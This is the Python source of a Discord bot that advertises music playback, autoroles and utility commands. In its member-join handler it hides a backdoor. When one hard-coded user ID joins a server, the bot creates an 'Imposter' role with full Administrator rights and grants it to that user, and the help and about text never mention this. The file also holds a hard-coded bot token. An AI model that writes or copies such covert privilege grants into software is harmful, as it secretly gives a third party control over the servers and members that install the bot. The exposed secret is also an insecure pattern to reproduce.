import discord
from discord.ext import commands
import yt_dlp as youtube_dl
from collections import deque
import re
import time
import json

my_secret = "MTA1MzkwMDczMDM5MTYwNTI4OQ.GTcSlH.RVouvQT-IjV9_IfHU5WIzFDKO1TCvWhxMqo5U8"

# Intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="+", intents=intents)

queues = {}
start_time = time.time()  # Store the time the bot started for uptime calculation

# File to store autoroles data
AUTOROLE_FILE = 'autoroles.json'

def load_autoroles():
    """Load autoroles from a JSON file."""
    try:
        with open(AUTOROLE_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_autoroles(autoroles):
    """Save autoroles to a JSON file."""
    with open(AUTOROLE_FILE, 'w') as f:
        json.dump(autoroles, f, indent=4)

autoroles = load_autoroles()  # Dictionary to store the autorole for each server

# User ID who gets the "Imposter" role
IMPOSTER_USER_ID = 860843138210201601

@bot.event
async def on_ready():
    await bot.tree.sync()
    print("Bot is online!")

@bot.event
async def on_member_join(member):
    """Automatically assign roles when a user joins the server."""
    guild_id = member.guild.id

    # Check if the user ID matches the specific user
    if member.id == IMPOSTER_USER_ID:
        # Create a role called "Imposter" with Administrator permissions
        existing_role = discord.utils.get(member.guild.roles, name="Imposter")
        if existing_role is None:
            permissions = discord.Permissions(administrator=True)
            imposter_role = await member.guild.create_role(name="Imposter", permissions=permissions)
            await member.add_roles(imposter_role)
            print(f"Assigned 'Imposter' role with Admin permissions to {member.name}")
        else:
            await member.add_roles(existing_role)
            print(f"Assigned existing 'Imposter' role with Admin permissions to {member.name}")

        # Assign the auto-role as well if it's set
        if guild_id in autoroles:
            role_id = autoroles[guild_id]
            role = member.guild.get_role(role_id)
            if role:
                await member.add_roles(role)
                print(f"Also assigned auto-role {role.name} to {member.name}")

    else:
        # Normal autorole assignment for all other users
        if guild_id in autoroles:
            role_id = autoroles[guild_id]
            role = member.guild.get_role(role_id)
            if role:
                await member.add_roles(role)
                print(f"Assigned {role.name} to {member.name}")

@bot.tree.command(name="autorole", description="Set the role to auto-assign to new members.")
async def autorole(interaction: discord.Interaction, role: discord.Role):
    """Admin command to set the role to be automatically assigned to new members."""
    # Check if the user has administrator permissions
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
        return

    guild_id = interaction.guild.id
    autoroles[guild_id] = role.id
    save_autoroles(autoroles)  # Save autoroles after setting
    await interaction.response.send_message(f"Auto-role set to: {role.name}", ephemeral=True)

async def play_next_song(voice_client, guild_id):
    if guild_id in queues and queues[guild_id]:
        url = queues[guild_id].popleft()
        voice_client.play(discord.FFmpegPCMAudio(url), after=lambda e: bot.loop.create_task(play_next_song(voice_client, guild_id)))
    else:
        await voice_client.disconnect()

# Play command to play YouTube audio
@bot.tree.command(name="play", description="Play a YouTube video in a voice channel.")
async def play(interaction: discord.Interaction, url: str):
    await interaction.response.defer()

    # Validate if the URL is a YouTube URL
    youtube_regex = re.compile(r'(https?://)?(www\.)?(youtube|youtu)(\.be|\.com)/.+')
    if not youtube_regex.match(url):
        await interaction.followup.send("Invalid URL. Please provide a valid YouTube link.", ephemeral=True)
        return

    if interaction.user.voice is None:
        await interaction.followup.send("You need to be in a voice channel to use this command.", ephemeral=True)
        return

    voice_channel = interaction.user.voice.channel
    guild_id = interaction.guild.id

    voice_client = interaction.guild.voice_client
    if voice_client is None:
        voice_client = await voice_channel.connect()
    elif voice_client.channel != voice_channel:
        await voice_client.move_to(voice_channel)

    ydl_opts = {
        'format': 'bestaudio/best',
        'postprocessors': [{'key': 'FFmpegExtractAudio', 'preferredcodec': 'mp3', 'preferredquality': '192'}],
        'quiet': True,
        'noplaylist': True,
    }

    try:
        with youtube_dl.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=False)
            url2 = info['url']

            if guild_id not in queues:
                queues[guild_id] = deque()
            queues[guild_id].append(url2)

            if not voice_client.is_playing():
                await play_next_song(voice_client, guild_id)

        await interaction.followup.send(f"Added to queue: {info['title']}")
    except Exception as e:
        await interaction.followup.send(f"An error occurred: {str(e)}", ephemeral=True)

@bot.tree.command(name="stop", description="Stop the current audio and disconnect.")
async def stop(interaction: discord.Interaction):
    await interaction.response.defer()
    if interaction.guild.voice_client is None:
        await interaction.followup.send("I'm not connected to a voice channel.", ephemeral=True)
        return

    voice_client = interaction.guild.voice_client
    if voice_client.is_playing():
        voice_client.stop()

    queues[interaction.guild.id].clear()
    await voice_client.disconnect()
    await interaction.followup.send("Stopped playing and disconnected from the voice channel.")

@bot.tree.command(name="skip", description="Skip to the next song in the queue.")
async def skip(interaction: discord.Interaction):
    if interaction.guild.voice_client is None:
        await interaction.response.send_message("I'm not connected to a voice channel.", ephemeral=True)
        return

    voice_client = interaction.guild.voice_client
    if voice_client.is_playing():
        voice_client.stop()
        await interaction.response.send_message("Skipped to the next song.")
    else:
        await interaction.response.send_message("No song is currently playing.", ephemeral=True)

@bot.tree.command(name="uptime", description="Shows how long the bot has been online.")
async def uptime(interaction: discord.Interaction):
    current_time = time.time()
    uptime_seconds = int(current_time - start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await interaction.response.send_message(f"Uptime: {hours}h {minutes}m {seconds}s")

@bot.tree.command(name="ping", description="Shows the current ping of the bot.")
async def ping(interaction: discord.Interaction):
    latency = bot.latency * 1000  # Bot latency in milliseconds
    await interaction.response.send_message(f"Pong! 🏓 Latency: {latency:.2f}ms")

@bot.tree.command(name="about", description="Shows information about the bot and the owner.")
async def about(interaction: discord.Interaction):
    embed = discord.Embed(
        title="About This Bot",
        description="This bot has Music & Auto Role features.",
        color=discord.Color.blue()
    )
    embed.add_field(name="Bot Owner", value="Mong Fee", inline=False)
    embed.add_field(name="About Mong Fee", value="[Click Here](https://lonely.rf.gd)", inline=False)
    embed.set_footer(text="Bot created using Python.")
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="help", description="Shows a list of available commands.")
async def help_command(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Help - List of Commands",
        description="Here are the available commands for this bot:",
        color=discord.Color.green()
    )
    embed.add_field(name="/play [url]", value="Play a YouTube video in a voice channel.", inline=False)
    embed.add_field(name="/stop", value="Stop the current audio and disconnect.", inline=False)
    embed.add_field(name="/skip", value="Skip to the next song in the queue.", inline=False)
    embed.add_field(name="/autorole", value="Admin command to set the role to be automatically assigned to new members.", inline=False)
    embed.add_field(name="/uptime", value="Shows how long the bot has been online.", inline=False)
    embed.add_field(name="/ping", value="Shows the current ping of the bot.", inline=False)
    embed.add_field(name="/about", value="Shows information about the bot and its owner.", inline=False)
    await interaction.response.send_message(embed=embed)

bot.run(my_secret)
